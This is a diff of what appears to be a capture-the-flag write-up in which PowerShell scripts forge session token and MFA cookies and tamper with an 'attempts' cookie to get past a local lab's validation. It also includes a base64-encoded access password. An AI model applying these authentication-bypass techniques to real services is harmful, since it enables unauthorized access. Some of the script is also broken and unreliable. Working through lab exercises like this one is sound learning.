@@ -1157,12 +1157,12 @@ $Credential = New-Object System.Management.Automation.PSCredential($username, $p
 $webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 $tokenCookie = New-Object System.Net.Cookie
 $tokenCookie.Name = "token"
-$tokenCookie.Value = "5f8dd236f862f4507835b0e418907ffc"  # Known working MD5
+$tokenCookie.Value = "67c7aef0d5d3e97ad2488babd2f4c749"  # Known working MD5
 $tokenCookie.Domain = "127.0.0.1"
 $webSession.Cookies.Add($tokenCookie)
 
 # Let's try with 'admin' hash first
-$response1 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" `
+$response1 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60" `
                               -Method GET `
                               -WebSession $webSession `
                               -Credential $Credential `
@@ -1178,12 +1178,13 @@ $mfaCookie.Value = $mfaValue
 $mfaCookie.Domain = "127.0.0.1"
 $webSession.Cookies.Add($mfaCookie)
 
-$response2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" `
+$response2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60" `
                               -Method GET `
                               -WebSession $webSession `
                               -Credential $Credential `
                               -AllowUnencryptedAuthentication
 
+$response1.Content
 $response2.Content
 ```
 
@@ -1210,12 +1211,12 @@ $response2.Content
 
 
 ```powershell
-$sha256 = "4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C"
+$sha256 = "bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60"
 # Step 1: First request to get the MFA token
 $webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 $tokenCookie = New-Object System.Net.Cookie
 $tokenCookie.Name = "token"
-$tokenCookie.Value = "5f8dd236f862f4507835b0e418907ffc"
+$tokenCookie.Value = "67c7aef0d5d3e97ad2488babd2f4c749"
 $tokenCookie.Domain = "127.0.0.1"
 $webSession.Cookies.Add($tokenCookie)
 
@@ -1252,67 +1253,67 @@ $response2.Content
 Changed code
 
 ```powershell
-# Initialize session
+$username = "admin" # Replace with your actual username 
+$password = ConvertTo-SecureString "admin" -AsPlainText -Force # Replace with your actual password 
+$Credential = New-Object System.Management.Automation.PSCredential($username, $password)
+```
+
+```powershell
+$sha256 = "bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60"
+# Step 1: First request to get the MFA token
 $webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 $tokenCookie = New-Object System.Net.Cookie
 $tokenCookie.Name = "token"
-$tokenCookie.Value = "5f8dd236f862f4507835b0e418907ffc"
+$tokenCookie.Value = "67c7aef0d5d3e97ad2488babd2f4c749"
 $tokenCookie.Domain = "127.0.0.1"
 $webSession.Cookies.Add($tokenCookie)
 
-for ($i = 1; $i -le 10; $i++) {
-    try {
-        Write-Host "Iteration ${i}: Requesting MFA token..."
+# Get initial MFA token
+$response1 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$sha256" `
+                              -Method GET `
+                              -WebSession $webSession `
+                              -Credential $Credential `
+                              -AllowUnencryptedAuthentication
 
-        # Request MFA token
-        $response1 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" `
-                                      -Method GET `
-                                      -WebSession $webSession `
-                                      -Credential $Credential `
-                                      -AllowUnencryptedAuthentication
-
-        # Extract MFA token
-        if ($response1.Content -match "/mfa_validate/([a-f0-9]{64})") {
-            $mfaValue = $matches[1]
-            Write-Host "Extracted MFA Token: $mfaValue"
-        } else {
-            Write-Host "Failed to extract MFA token on iteration $i."
-            break
-        }
-
-        # Add MFA token as a cookie
-        $mfaCookie = New-Object System.Net.Cookie
-        $mfaCookie.Name = "mfa_token"
-        $mfaCookie.Value = $mfaValue
-        $mfaCookie.Domain = "127.0.0.1"
-        $webSession.Cookies.Add($mfaCookie)
-
-        # Validate MFA token
-        Write-Host "Iteration ${i}: Validating MFA token..."
-        $response2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" `
-                                      -Method GET `
-                                      -WebSession $webSession `
-                                      -Credential $Credential `
-                                      -AllowUnencryptedAuthentication
-
-        if ($response2.StatusCode -eq 200) {
-            Write-Host "Iteration ${i}: Validation succeeded."
-        } else {
-            Write-Host "Iteration ${i}: Validation failed. Response: $($response2.Content)"
-        }
-    } catch {
-        Write-Host "Error on iteration ${i}: $_"
-        break
-    }
+$mfaValue = if($response1.Content -match "href='([0-9.]+)'") {
+    $matches[1]
+} else {
+    Write-Error "Failed to extract MFA value"
+    exit 1
 }
 
-$response.Content
+# Test threshold with multiple cookie attempts
+for ($i = 1; $i -le 11; $i++) {
+    $mfaCookie = New-Object System.Net.Cookie
+    $attemptsCookie.Name = "attempts" 
+    $attemptsCookie.Value = "11"
+    $mfaCookie.Name = "mfa_token"
+    $mfaCookie.Value = $mfaValue
+    $mfaCookie.Domain = "127.0.0.1"
+    $webSession.Cookies.Add($mfaCookie)
+    
+    $response2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/$sha256" `
+                                  -Method GET `
+                                  -WebSession $webSession `
+                                  -Credential $Credential `
+                                  -AllowUnencryptedAuthentication
+    
+    Write-Host "Cookie attempt ${i}: $($response2.Content)"
+}
 $response1.Content
 $response2.Content
+$webSession.Cookies.GetCookies("http://127.0.0.1:1225") | Format-Table Name, Value
 ```
+
+```powershell
+$base64Value = "Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg=="
+
+$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Value))
+Write-Host "Decoded message: $decoded"
+```
+
 
 
 ```powershell
 
 ```
-
